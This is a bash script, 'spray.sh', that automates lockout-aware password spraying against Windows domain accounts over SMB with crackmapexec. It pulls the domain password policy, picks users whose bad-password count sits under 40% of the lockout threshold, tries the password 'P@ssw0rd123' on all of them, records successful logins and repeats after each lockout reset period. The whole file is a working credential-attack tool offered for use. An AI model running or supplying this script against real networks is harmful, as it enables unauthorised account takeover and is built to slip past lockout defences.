#!/bin/bash
#title           :spray.sh
#description     :This script will automate safe password spraying through all domain users that have badpwdtime < (account_lockout_threshold * 0.4) 
#author		 :whoamins
#date            :02.08.2022
#version         :0.1
#usage		 :./script.sh ip username password
#notes           :Install crackmapexec to use this script.
#bash_version    :5.1.16(1)-release
#==============================================================================

ip=""
username=""
password=""
account_lockout_threshold=0

check_for_crackmapexec() {
	if ! command -v crackmapexec &> /dev/null
	then
		echo "sudo apt-get install crackmapexec"
		exit
	fi
}

get_all_users() {
	crackmapexec smb $ip -u $username -p $password --users > /tmp/users.txt
}

get_users_with_suitable_badpwdtime() {
	tail /tmp/users.txt -n +4 | awk -v safe_badpwdcount="$safe_badpwdcount" '{if($7 < safe_badpwdcount) print $5}' | cut -d '\' -f2  | tee /tmp/all_suitable_users.txt
}

start_brute_with_suitable_users() {
	crackmapexec smb $ip -u /tmp/all_suitable_users.txt -p P@ssw0rd123 --continue-on-success | tee /tmp/spray_result.txt
	cat /tmp/spray_result.txt | grep "+" > /tmp/success_spray.txt
}

get_domain_password_policy() {
	crackmapexec smb $ip -u $username -p $password --pass-pol | tee /tmp/pass_policy
	account_lockout_threshold=$(cat /tmp/pass_policy | grep "Account Lockout Threshold:" | awk -F ':' '{print $2}')
	reset_account_lockout_counter=$(cat /tmp/pass_policy | grep "Reset Account Lockout Counter:" | cut -d ':' -f2 | cut -d ' ' -f2)
	b=0.4 # 0.4 = 40%
	safe_badpwdcount=$(echo "$account_lockout_threshold $b" | awk '{print $1 * $2}')
	reset_account_lockout_counter="${reset_account_lockout_counter}m" # TODO: Minutes, Hours....
	echo "safe_badpwdcount, $safe_badpwdcount"
	echo "reset_account_lockout_counter, $reset_account_lockout_counter"
}

get_args() {
    ip=${commandline_args[0]};
    username=${commandline_args[1]}
    password=${commandline_args[2]}
}

start() {
	get_args $1 $2 $3
	check_for_crackmapexec
	
	while true
	do
		get_domain_password_policy
		get_all_users
		get_users_with_suitable_badpwdtime
		start_brute_with_suitable_users
		sleep $reset_account_lockout_counter
	done
}

commandline_args=("$@")

start
